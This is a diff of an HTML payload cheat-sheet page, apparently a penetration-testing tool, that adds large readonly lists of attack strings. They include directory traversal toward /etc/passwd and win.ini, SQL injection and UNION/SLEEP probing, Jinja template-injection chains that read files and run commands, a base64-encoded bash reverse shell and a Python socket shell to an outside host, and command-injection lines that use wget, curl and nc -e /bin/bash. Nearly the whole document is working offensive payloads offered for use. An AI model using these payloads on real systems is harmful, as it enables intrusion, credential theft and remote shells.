@@ -116,16 +116,409 @@
 &lt;script&gt;alert('XSS Payload');&lt;/script&gt;
         </textarea>
         <textarea id="lfi" class="payload" readonly>
+..\WINDOWS\win.ini
+..\..\WINDOWS\win.ini
+..\..\..\WINDOWS\win.ini
+..\..\..\..\WINDOWS\win.ini
+..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\WINDOWS\win.ini
+\..\..\..\WINDOWS\win.ini
+\..\..\WINDOWS\win.ini
+\..\WINDOWS\win.ini
+\WINDOWS\win.ini
+/etc/passwd
+/../etc/passwd
+/../../etc/passwd
+/../../../etc/passwd
+/../../../../etc/passwd
+/../../../../../etc/passwd
+/../../../../../../etc/passwd
+/../../../../../../../etc/passwd
+/../../../../../../../../etc/passwd
+/../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
 ../../../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../etc/passwd
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+/etc/passwd%00
+/../etc/passwd%00
+/../../etc/passwd
+/../../../etc/passwd%00
+/../../../../etc/passwd%00
+/../../../../../etc/passwd%00
+/../../../../../../etc/passwd%00
+/../../../../../../../etc/passwd%00
+/../../../../../../../../etc/passwd%00
+/../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../etc/passwd%00
+../../etc/passwd%00
+../etc/passwd%00
         </textarea>
         <textarea id="sql" class="payload" readonly>
-' OR 1=1--
+OR 1=1
+1 OR 1=1
+1 OR 1=1#
+1 OR 1=1 -- -
+1') and '1'='1'
+1") and "1"="1"
+1' or '1'='1
+1' or '1'='1'#
+1' or '1'='1'-- -
+admin
+admin' #
+admin' -- -
+admin'/*
+1 order by 1
+1 order by 2
+1 order by 3
+1 order by 4
+1 order by 5
+1 order by 6
+1 order by 7
+1 order by 8
+1 order by 9
+ORDER BY 1,SLEEP(5)
+ORDER BY 1,SLEEP(5)#
+ORDER BY 1,SLEEP(5),3
+ORDER BY 1,SLEEP(5),3#
+ORDER BY 1,SLEEP(5),3,4
+ORDER BY 1,SLEEP(5),3,4#
+ORDER BY 1,SLEEP(5),3,4,5
+ORDER BY 1,SLEEP(5),3,4,5#
+ORDER BY 1,SLEEP(5),3,4,5,6
+ORDER BY 1,SLEEP(5),3,4,5,6#
+ORDER BY 1,SLEEP(5),3,4,5,6,7
+ORDER BY 1,SLEEP(5),3,4,5,6,7#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ORDER BY 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+' UNION SELECT 1,2,3'
+'" UNION SELECT 1,SLEEP(5),"'3
+'" UNION SELECT 1,SLEEP(5),"'3'"#
+'" UNION SELECT 1,SLEEP(5),3,4#
+'" UNION SELECT 1,SLEEP(5),3,4,5#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+'" UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+UNION SELECT NULL
+UNION SELECT NULL,NULL
+UNION SELECT NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL
+a' UNION SELECT NULL,NULL
+a' UNION SELECT NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL
+0' UNION SELECT NULL,NULL
+0' UNION SELECT NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL
+' UNION SELECT NULL,NULL
+' UNION SELECT NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
         </textarea>
         <textarea id="bypasssql" class="payload" readonly>
 ' UNION SELECT 1, version(), 3--
         </textarea>
-        <textarea id="ssrf" class="payload" readonly>
-http://evil.com/malicious-file.txt
+        <textarea id="ssti" class="payload" readonly>
+Basic
+{{ 1 + 1 }} 
+
+Debug Statement
+{% debug %}
+
+Dump all config variables
+{{ config }}
+
+Accessing Global Objects
+{{ [] }}
+{{ '' }}
+{{ () }}
+{{ dict }}
+{{ config }}
+{{ request }}
+
+Recovering
+{{ [].__class__ }}
+{{ ''.__class__ }}
+{{ ()["__class__"] }}
+{{ request["__class__"] }}
+{{ config.__class__ }}
+
+{{ dict  }}
+{{ dict.__base__ }}
+{{ dict["__base__"] }}
+{{ dict.mro()[-1] }}
+{{ dict.__mro__[-1] }}
+{{ (dict|attr("__mro__"))[-1] }}
+{{ (dict|attr("\x5f\x5fmro\x5f\x5f"))[-1] }}
+{{ dict.__base__.__subclasses__() }}
+{{ dict.mro()[-1].__subclasses__() }}
+{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
+
+{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+
+{{ ().__class__.__base__.__subclasses__() }}
+{{ [].__class__.__mro__[-1].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+
+{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
+{{ request.__class__.mro()[-1].__subclasses__() }}
+{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+
+{{ [].class.base.subclasses() }}
+{{ ''.class.mro()[1].subclasses() }}
+
+Read/Write remote file
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+
+RCE
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+
+            Filter bypasses
+            {{ request.__class__ }}
+{{ request["__class__"] }}
+{{ request['\x5f\x5fclass\x5f\x5f'] }}
+{{ request|attr("__class__") }}
+{{ request|attr(["_"*2, "class", "_"*2]|join) }}
+
+{{ request|attr(request.headers.c) }}
+{{ request|attr(request.args.c) }}
+{{ request|attr(request.query_string[2:16].decode() }}
+{{ request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) }}
+
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+            
+
+
+
         </textarea>
         <textarea id="sqli" class="payload" readonly>
 ' UNION SELECT password FROM users WHERE username = 'admin'--
@@ -134,7 +527,87 @@ http://evil.com/malicious-file.txt
 ; nc -nv 192.168.1.1 4444 -e /bin/bash
         </textarea>
         <textarea id="cmdi" class="payload" readonly>
-; ls -la
+eval('id')
+eval('ls')
+eval('pwd')
+eval('whoami')
+eval('sleep 20')
+eval('cat /etc/passwd')
+127.0.0.1 & id
+127.0.0.1 && id
+127.0.0.1 ; id
+127.0.0.1 | id
+127.0.0.1 & whoami
+127.0.0.1 && whoami
+127.0.0.1 ; whoami
+127.0.0.1 | whoami
+127.0.0.1 & sleep 20
+127.0.0.1 && sleep 20
+127.0.0.1 ; sleep 20
+127.0.0.1 | sleep 20
+127.0.0.1 & cat /etc/passwd
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 ; cat /etc/passwd
+127.0.0.1 | cat /etc/passwd
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="curl http://log.michalszalkowski.com" -->
+<!--#exec cmd="dir" -->
+<!--#exec cmd="ipconfig" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="perl -e 'print "X"*5000'" -->
+<!--#exec cmd="sleep 10" -->
+<!--#exec cmd="uname" -->
+<!--#exec cmd="/usr/bin/id;-->
+<!--#exec cmd="whoami" -->
+" & whoami
+" && whoami
+" | whoami
+" || whoami
+" whoami
+"; whoami
+& whoami
+&& whoami
+' & whoami
+' && whoami
+' || whoami
+' whoami
+'; whoami
+; whoami
+| whoami
+whoami
+() { :;}; wget http://log.michalszalkowski.com
+& wget http://log.michalszalkowski.com
+| wget http://log.michalszalkowski.com
+&& wget http://log.michalszalkowski.com
+; wget http://log.michalszalkowski.com
+wget http://log.michalszalkowski.com
+& wget http://log.michalszalkowski.com
+&& wget http://log.michalszalkowski.com
+; wget http://log.michalszalkowski.com
+$(`cat /etc/passwd`)
+$(`dir`)
+$(`ls`)
+;${@print(md5(0))};
+${@print("0")}
+{${sleep(20)}}
+%20{${sleep(20)}}
+{${sleep(hexdec(dechex(20)))}} 
+$(`whoami`)
+& id
+&&id
+;id
+;id;
+;id|
+`id`
+| id
+|id
+;id\n
+& ifconfig
+&& ifconfig
+; ifconfig
+| ifconfig
+ifconfig
         </textarea>
         <textarea id="xml" class="payload" readonly>
 &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
